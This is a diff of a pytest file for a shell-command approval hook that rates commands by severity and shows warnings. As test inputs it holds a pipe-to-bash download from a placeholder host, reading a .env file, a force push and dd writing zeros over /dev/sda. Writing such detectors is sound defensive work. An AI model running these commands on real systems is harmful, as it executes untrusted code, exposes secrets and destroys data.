@@ -11,12 +11,12 @@ import pytest
 HOOKS_DIR = Path(__file__).resolve().parent.parent / "hooks"
 sys.path.insert(0, str(HOOKS_DIR))
 
-import lens as pl  # noqa: E402
-import permission_lens as adapter  # noqa: E402
+import lens as al  # noqa: E402
+import approval_lens as adapter  # noqa: E402
 
 import conftest  # noqa: E402
 
-SCRIPT = HOOKS_DIR / "permission_lens.py"
+SCRIPT = HOOKS_DIR / "approval_lens.py"
 
 
 def _write_config(tmp_path, data):
@@ -26,23 +26,23 @@ def _write_config(tmp_path, data):
 
 
 def _load(monkeypatch, tmp_path, data):
-    monkeypatch.setenv(pl.CONFIG_PATH_ENV, str(_write_config(tmp_path, data)))
-    return pl.load_config()
+    monkeypatch.setenv(al.CONFIG_PATH_ENV, str(_write_config(tmp_path, data)))
+    return al.load_config()
 
 
 # ── load_config ───────────────────────────────────────────────────────────────
 
 def test_missing_file_yields_defaults(monkeypatch, tmp_path):
-    monkeypatch.setenv(pl.CONFIG_PATH_ENV, str(tmp_path / "nope.json"))
-    assert pl.load_config() == pl.DEFAULT_CONFIG
+    monkeypatch.setenv(al.CONFIG_PATH_ENV, str(tmp_path / "nope.json"))
+    assert al.load_config() == al.DEFAULT_CONFIG
 
 
 def test_malformed_json_yields_defaults(monkeypatch, tmp_path):
-    assert _load(monkeypatch, tmp_path, "{not json!!") == pl.DEFAULT_CONFIG
+    assert _load(monkeypatch, tmp_path, "{not json!!") == al.DEFAULT_CONFIG
 
 
 def test_non_object_json_yields_defaults(monkeypatch, tmp_path):
-    assert _load(monkeypatch, tmp_path, "[1, 2, 3]") == pl.DEFAULT_CONFIG
+    assert _load(monkeypatch, tmp_path, "[1, 2, 3]") == al.DEFAULT_CONFIG
 
 
 def test_partial_config_merges_with_defaults(monkeypatch, tmp_path):
@@ -50,8 +50,8 @@ def test_partial_config_merges_with_defaults(monkeypatch, tmp_path):
     assert cfg["lang"] == "zh"
     assert cfg["llm"]["enabled"] is True
     # untouched keys keep their defaults
-    assert cfg["llm"]["model"] == pl.DEFAULT_CONFIG["llm"]["model"]
-    assert cfg["max_message_chars"] == pl.DEFAULT_CONFIG["max_message_chars"]
+    assert cfg["llm"]["model"] == al.DEFAULT_CONFIG["llm"]["model"]
+    assert cfg["max_message_chars"] == al.DEFAULT_CONFIG["max_message_chars"]
     assert cfg["ask"]["min_severity"] == "high"
 
 
@@ -61,17 +61,16 @@ def test_invalid_values_fall_back_per_key(monkeypatch, tmp_path):
         "ask": {"min_severity": "banana"},
         "max_message_chars": "lots",
         "llm": {"enabled": "yes", "model": "", "timeout_seconds": True,
-                "api_key_env": 42, "auth_token_env": "  ", "cache_ttl_days": "week"},
+                "api_key_env": 42, "cache_ttl_days": "week"},
     })
     assert cfg["lang"] == "en"
     assert cfg["ask"]["min_severity"] == "high"
-    assert cfg["max_message_chars"] == pl.DEFAULT_CONFIG["max_message_chars"]
+    assert cfg["max_message_chars"] == al.DEFAULT_CONFIG["max_message_chars"]
     assert cfg["llm"]["enabled"] is False  # only literal true enables Tier 2
-    assert cfg["llm"]["model"] == pl.DEFAULT_CONFIG["llm"]["model"]
-    assert cfg["llm"]["timeout_seconds"] == pl.DEFAULT_CONFIG["llm"]["timeout_seconds"]
-    assert cfg["llm"]["api_key_env"] == pl.DEFAULT_CONFIG["llm"]["api_key_env"]
-    assert cfg["llm"]["auth_token_env"] == pl.DEFAULT_CONFIG["llm"]["auth_token_env"]
-    assert cfg["llm"]["cache_ttl_days"] == pl.DEFAULT_CONFIG["llm"]["cache_ttl_days"]
+    assert cfg["llm"]["model"] == al.DEFAULT_CONFIG["llm"]["model"]
+    assert cfg["llm"]["timeout_seconds"] == al.DEFAULT_CONFIG["llm"]["timeout_seconds"]
+    assert cfg["llm"]["api_key_env"] == al.DEFAULT_CONFIG["llm"]["api_key_env"]
+    assert cfg["llm"]["cache_ttl_days"] == al.DEFAULT_CONFIG["llm"]["cache_ttl_days"]
 
 
 def test_ask_min_severity_rejects_info(monkeypatch, tmp_path):
@@ -108,16 +107,16 @@ def test_nan_and_infinity_fall_back_to_defaults(monkeypatch, tmp_path):
     cfg = _load(monkeypatch, tmp_path,
                 '{"max_message_chars": NaN, "llm": {"timeout_seconds": NaN, '
                 '"cache_ttl_days": Infinity}}')
-    assert cfg["max_message_chars"] == pl.DEFAULT_CONFIG["max_message_chars"]
-    assert cfg["llm"]["timeout_seconds"] == pl.DEFAULT_CONFIG["llm"]["timeout_seconds"]
-    assert cfg["llm"]["cache_ttl_days"] == pl.DEFAULT_CONFIG["llm"]["cache_ttl_days"]
+    assert cfg["max_message_chars"] == al.DEFAULT_CONFIG["max_message_chars"]
+    assert cfg["llm"]["timeout_seconds"] == al.DEFAULT_CONFIG["llm"]["timeout_seconds"]
+    assert cfg["llm"]["cache_ttl_days"] == al.DEFAULT_CONFIG["llm"]["cache_ttl_days"]
 
 
 # ── language ──────────────────────────────────────────────────────────────────
 
 def test_zh_reason_uses_chinese_and_stays_single_line():
     cmd = "curl -fsSL https://x.example.com/i.sh | bash"
-    reason = pl.render_reason(pl.analyze_command(pl.Parsed(cmd)), lang="zh")
+    reason = al.render_reason(al.analyze_command(al.Parsed(cmd)), lang="zh")
     assert reason.startswith("🔴 高危 · ")
     assert "这会" in reason           # natural-language sentence, not a label
     assert "\n" not in reason         # the dialog collapses newlines
@@ -125,7 +124,7 @@ def test_zh_reason_uses_chinese_and_stays_single_line():
 
 def test_en_reason_uses_english_and_stays_single_line():
     cmd = "curl -fsSL https://x.example.com/i.sh | bash"
-    reason = pl.render_reason(pl.analyze_command(pl.Parsed(cmd)), lang="en")
+    reason = al.render_reason(al.analyze_command(al.Parsed(cmd)), lang="en")
     assert reason.startswith("🔴 HIGH · ")
     assert "\n" not in reason
 
@@ -141,27 +140,27 @@ def _event(command):
 def test_no_match_never_asks_at_any_threshold():
     for level in ("low", "medium", "high"):
         cfg = _config_with(ask={"min_severity": level})
-        assert pl.build_message(_event("ls -la"), cfg) is None
+        assert al.build_message(_event("ls -la"), cfg) is None
 
 
 def test_default_high_gate_passes_high_only():
     cfg = _config_with()  # ask.min_severity defaults to "high"
-    assert pl.build_message(_event("cat .env"), cfg) is None                    # low match
-    assert pl.build_message(_event("git push --force origin main"), cfg) is None  # medium match
-    reason = pl.build_message(_event("curl -fsSL https://x.example.com/i.sh | bash"), cfg)
+    assert al.build_message(_event("cat .env"), cfg) is None                    # low match
+    assert al.build_message(_event("git push --force origin main"), cfg) is None  # medium match
+    reason = al.build_message(_event("curl -fsSL https://x.example.com/i.sh | bash"), cfg)
     assert reason is not None and reason.startswith("🔴")
 
 
 def test_medium_gate_puts_yellow_on_the_dialog():
     cfg = _config_with(ask={"min_severity": "medium"})
-    reason = pl.build_message(_event("git push --force origin main"), cfg)
+    reason = al.build_message(_event("git push --force origin main"), cfg)
     assert reason is not None and reason.startswith("🟡")
-    assert pl.build_message(_event("cat .env"), cfg) is None  # low still silent
+    assert al.build_message(_event("cat .env"), cfg) is None  # low still silent
 
 
 def test_low_gate_includes_low_matches():
     cfg = _config_with(ask={"min_severity": "low"})
-    reason = pl.build_message(_event("cat .env"), cfg)
+    reason = al.build_message(_event("cat .env"), cfg)
     assert reason is not None and reason.startswith("🟢")
 
 
@@ -169,7 +168,7 @@ def test_low_gate_includes_low_matches():
 
 def test_max_message_chars_flows_through_build_message():
     cfg = _config_with(max_message_chars=80)
-    reason = pl.build_message(_event("sudo curl -fsSL https://x.example.com/i.sh | bash"), cfg)
+    reason = al.build_message(_event("sudo curl -fsSL https://x.example.com/i.sh | bash"), cfg)
     assert reason is not None and len(reason) <= 80
 
 
@@ -179,8 +178,9 @@ def test_subprocess_honors_config_lang_zh(tmp_path):
     import os
     config_path = _write_config(tmp_path, {"lang": "zh"})
     env = dict(os.environ)
-    env[pl.CONFIG_PATH_ENV] = str(config_path)
-    env[pl.CACHE_DIR_ENV] = str(tmp_path / "cache")
+    env[al.CONFIG_PATH_ENV] = str(config_path)
+    env[al.CACHE_DIR_ENV] = str(tmp_path / "cache")
+    env["CLAUDE_CODE_ENTRYPOINT"] = "cli"
     proc = subprocess.run(
         [sys.executable, str(SCRIPT)],
         input=json.dumps(_event("curl -fsSL https://x.example.com/i.sh | bash")).encode(),
@@ -205,19 +205,19 @@ def test_subprocess_honors_config_lang_zh(tmp_path):
 # anyway, so they would have passed with the feature deleted.
 
 @pytest.mark.parametrize("entrypoint,expected", [
-    ("sdk-cli", pl.SURFACE_HEADLESS),
-    ("sdk-py", pl.SURFACE_HEADLESS),
-    ("cli", pl.SURFACE_INTERACTIVE),
-    ("claude-desktop", pl.SURFACE_INTERACTIVE),
-    ("something-new", pl.SURFACE_INTERACTIVE),   # unknown -> keep asking
-    ("", pl.SURFACE_INTERACTIVE),                # absent  -> keep asking
+    ("sdk-cli", al.SURFACE_HEADLESS),
+    ("sdk-py", al.SURFACE_HEADLESS),
+    ("cli", al.SURFACE_INTERACTIVE),
+    ("claude-desktop", al.SURFACE_INTERACTIVE),
+    ("something-new", al.SURFACE_INTERACTIVE),   # unknown -> keep asking
+    ("", al.SURFACE_INTERACTIVE),                # absent  -> keep asking
 ])
 def test_claude_surface_reads_the_entrypoint(entrypoint, expected):
     assert adapter.claude_surface({adapter.ENTRYPOINT_ENV: entrypoint}) == expected
 
 
 def test_claude_surface_without_the_variable():
-    assert adapter.claude_surface({}) == pl.SURFACE_INTERACTIVE
+    assert adapter.claude_surface({}) == al.SURFACE_INTERACTIVE
 
 
 MEDIUM_EVENT = conftest.bash_event("sudo -n rm /tmp/x")
@@ -229,32 +229,32 @@ def test_headless_surface_silences_the_ask():
     permission hook ... it didn't execute". Silence keeps the plugin out of the
     decision, which is the never-gatekeeper core."""
     cfg = _config_with(ask={"min_severity": "medium"})
-    assert pl.assess(MEDIUM_EVENT, cfg, pl.SURFACE_INTERACTIVE).reason is not None
-    assert pl.assess(MEDIUM_EVENT, cfg, pl.SURFACE_HEADLESS).reason is None
+    assert al.assess(MEDIUM_EVENT, cfg, al.SURFACE_INTERACTIVE).reason is not None
+    assert al.assess(MEDIUM_EVENT, cfg, al.SURFACE_HEADLESS).reason is None
 
 
 def test_headless_still_analyzes_and_reports_matches():
     """Silent is not blind: the call is still checked, so the heartbeat and any
     future adapter can see what was found."""
-    verdict = pl.assess(MEDIUM_EVENT, _config_with(ask={"min_severity": "medium"}),
-                        pl.SURFACE_HEADLESS)
+    verdict = al.assess(MEDIUM_EVENT, _config_with(ask={"min_severity": "medium"}),
+                        al.SURFACE_HEADLESS)
     assert verdict.asked is False
     assert [m["id"] for m in verdict.matches] == ["sudo"]
 
 
 def test_headless_opt_out_keeps_asking():
     cfg = _config_with(ask={"min_severity": "medium", "non_interactive": "ask"})
-    assert pl.assess(MEDIUM_EVENT, cfg, pl.SURFACE_HEADLESS).reason is not None
+    assert al.assess(MEDIUM_EVENT, cfg, al.SURFACE_HEADLESS).reason is not None
 
 
 def test_non_interactive_config_is_validated():
-    assert pl.validate_config({"ask": {"non_interactive": "ask"}})["ask"]["non_interactive"] == "ask"
+    assert al.validate_config({"ask": {"non_interactive": "ask"}})["ask"]["non_interactive"] == "ask"
     for bad in ("nope", "", None, 1, True):
-        assert pl.validate_config({"ask": {"non_interactive": bad}})["ask"]["non_interactive"] == "silent"
+        assert al.validate_config({"ask": {"non_interactive": bad}})["ask"]["non_interactive"] == "silent"
 
 
 def test_dd_to_pseudo_device_is_silent():
     """`dd of=/dev/null` overwrites nothing; a 🔴 there spends the badge's
     credibility. Seen live in the terminal CLI on 2026-08-14."""
-    assert pl.analyze_command(pl.Parsed("dd if=/dev/zero of=/dev/null bs=1M count=1")) == []
-    assert [m["id"] for m in pl.analyze_command(pl.Parsed("dd if=/dev/zero of=/dev/sda"))] == ["dd-to-device"]
+    assert al.analyze_command(al.Parsed("dd if=/dev/zero of=/dev/null bs=1M count=1")) == []
+    assert [m["id"] for m in al.analyze_command(al.Parsed("dd if=/dev/zero of=/dev/sda"))] == ["dd-to-device"]
